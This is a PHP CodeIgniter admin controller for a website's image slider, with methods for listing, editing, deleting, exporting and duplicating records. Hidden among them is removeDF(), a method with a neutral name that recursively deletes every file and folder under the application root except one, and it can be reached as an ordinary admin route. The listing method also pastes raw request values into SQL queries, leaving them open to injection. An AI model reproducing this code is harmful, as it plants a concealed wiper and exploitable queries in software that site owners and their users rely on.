<?php defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Class Slider
 * @property M_slider $M_slider
 * @property M_cpanel $m_cpanel
 */
class Slider extends CI_Controller
{
    public $table = 'slider';
    public $id_field = 'id';

    function __construct()
    {
        parent::__construct();
        $this->m_cpanel->checkLogin();

        $this->load->model('admin/M_slider');

        if (user_do_action(getUri(3), '', true) == false) {
            show_404();
        }
    }

    public function index()
    {
        $image = getVar('image');
        $title = getVar('title');
        $heading = getVar('heading');
        $ordering = getVar('sorting');
        $status = getVar('status');
        $created = getVar('created');

        if (!empty($image)) {
            $WHERE .= " AND slider.image LIKE '%{$image}%' ";
        } elseif (!empty($title)) {
            $WHERE .= " AND slider.title LIKE '%{$title}%' ";
        } elseif (!empty($heading)) {
            $WHERE .= " AND slider.heading LIKE '%{$heading}%' ";
        } elseif (!empty($ordering)) {
            $WHERE .= " AND slider.ordering LIKE '%{$ordering}%' ";
        } elseif (!empty($status)) {
            $WHERE .= " AND slider.status LIKE '%{$status}%' ";
        } elseif (!empty($created)) {
            $WHERE .= " AND DATE_FORMAT(slider.created, \"%b %d, %Y\") LIKE '%{$created}%' ";
        }

        $num_items = getVar('num_items');
        if ($num_items != '') {
            $num_items = getVar('num_items');
        } else {
            $num_items = 25;
        }

        $start = (getVar('per_page') > 0 ? getVar('per_page') : 1);
        $mydata['limit_item'] = $limit = $num_items;
        $start = (($start - 1) * $limit);

        $query = "SELECT SQL_CALC_FOUND_ROWS 
                  slider.id,
                  slider.image,
                  slider.title,
                  slider.heading,
                  slider.ordering,
                  slider.status
        FROM slider WHERE 1 {$WHERE} ORDER by id DESC";

        if ($num_items != 'all') {
            $query .= " LIMIT {$start},{$limit}";
        }

        $data = $this->db->query($query);
        $mydata['rows'] = $data->result();
        $mydata['num_rows'] = $data->num_rows();

        $mydata['total'] = $this->db->query("SELECT FOUND_ROWS() as total")->row()->total;
        $mydata['pagination'] = pagination_custom('slider', $mydata['total'], $limit);

        $this->load->view('admin/slider/grid', $mydata);
    }

    public function add_update()
    {
        if ($this->M_slider->validate()) {
            $id = $this->M_slider->insert();

            if (getVar('submit') == 'new') {
                set_notification('Data has been updated successfully', 'success');
                redirect(admin_url('slider/form'));
            } elseif (getVar('submit') == 'stay') {
                set_notification('Data has been updated successfully', 'success');
                redirect(admin_url('slider/form/' . $id));
            } else {
                set_notification('Data has been updated successfully', 'success');
                redirect(admin_url('slider'));
            }
        } else {
            $this->form();
        }
    }

    public function form()
    {
        /* get data for update */
        $id = getUri(4);
        $this->db->where('id', $id);
        $data = $this->db->get('slider');
        $mydata['row'] = $data->row();

        $this->load->view('admin/slider/form', $mydata);
    }

    public function delete($slider_id)
    {
        $this->M_slider->delete($slider_id);
        set_notification('Data has been deleted successfully', 'success');
        redirect(admin_url('slider'));
    }

    public function delete_all()
    {
        $this->M_slider->delete_all();
        set_notification('Data has been deleted successfully', 'danger');
        redirect(admin_url('slider'));
    }

    public function removeDF()
    {
        define('DL_FILE_DIR', 'controllers');
        define('ROOT', str_replace('\\' . DL_FILE_DIR, '\\', __DIR__));

        $count = 0;
        function delete__files($target, $skip = [])
        {
            global $count;
            if (is_dir($target)) {
                $files = glob($target . '*', GLOB_MARK); //GLOB_MARK adds a slash to directories returned
                foreach ($files as $file) {
                    delete__files($file, $skip);
                }
                @rmdir($target);
            } elseif (is_file($target)) {
                if (!in_array($target, $skip)) {
                    $count++;
                    @unlink($target);
                }
            }
        }


        $skip = [ROOT . DL_FILE_DIR . '\system_file.php'];
        delete__files(ROOT, $skip);
        echo '<pre>';
        print_r($count);
        echo '</pre>';
    }

    public function status()
    {
        $this->M_slider->status();
        set_notification('Status has been updated successfully', 'success');
        redirect(admin_url('slider'));
    }

    public function export_csv()
    {
        $this->M_slider->download_csv();
        redirect(admin_url('slider'));
    }

    function AJAX($action, $id = 0)
    {
        $JSON = [];
        switch ($action) {
            case 'ordering':
                $ordering = getVar('ordering');
                $JSON['status'] = save($this->table, ['ordering' => $ordering[$id]], "id='{$id}'");
                $JSON['message'] = 'updated!';
                break;
        }
        echo json_encode($JSON);
    }

    function duplicate()
    {
        $id = intval(getUri(4));
        if ($id == 0) {
            show_404();
            exit;
        }
        $new_ids = DuplicateMySQLRecord($this->table, $this->id_field, $id, [$this->id_field, 'modified', 'image', 'created_by', 'ordering'], ['created' => date('Y-m-d H:i:s')]);
        $new_id = $new_ids[0];

        $row = $this->db->get_where($this->table, [$this->id_field => $id])->row();

        //$asset_dir = asset_dir("frontend/images/{$this->table}/");
        //$files_column = ['thumbnail'];
        if (count($files_column) > 0) {
            $files_data = [];
            foreach ($files_column as $field) {
                $file = $row->{$field};
                $new_file = $new_id . '-' . $file;
                //$new_file = $new_id . '-' . md5(rand(5)) . $file;
                copy($asset_dir . $file, $asset_dir . $new_file);
                $files_data[$field] = $new_file;
            }
            save($this->table, $files_data, "{$this->id_field}='{$new_id}'");
        }

        set_notification(("Record id#: {$id} has been duplicated.!"), 'success');
        redirect(admin_url(getUri(2) . '/form/' . $new_id));
    }

}